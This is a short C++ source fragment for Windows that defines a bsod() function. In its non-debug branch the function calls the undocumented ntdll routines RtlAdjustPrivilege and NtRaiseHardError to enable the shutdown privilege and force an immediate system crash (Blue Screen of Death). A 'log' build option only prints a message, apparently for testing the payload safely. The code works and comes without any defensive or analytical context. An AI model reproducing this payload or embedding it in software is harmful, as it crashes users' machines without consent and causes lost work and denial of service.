#include <windows.h>
#ifdef log
#include <stdio.h>
void bsod() {printf("bsodddd \n");}
#else
extern"C"{NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege,BOOLEAN bEnablePrivilege,BOOLEAN IsThreadPrivilege,PBOOLEAN PreviousValue);NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus,ULONG NumberOfParameters,ULONG UnicodeStringParameterMask,PULONG_PTR Parameters,ULONG ValidResponseOption,PULONG Response);}
void bsod(){BOOLEAN t1;ULONG t2;RtlAdjustPrivilege(19, TRUE, FALSE, &t1);NtRaiseHardError(0xc0000022, 0, 0, nullptr, 6, &t2);}
#endif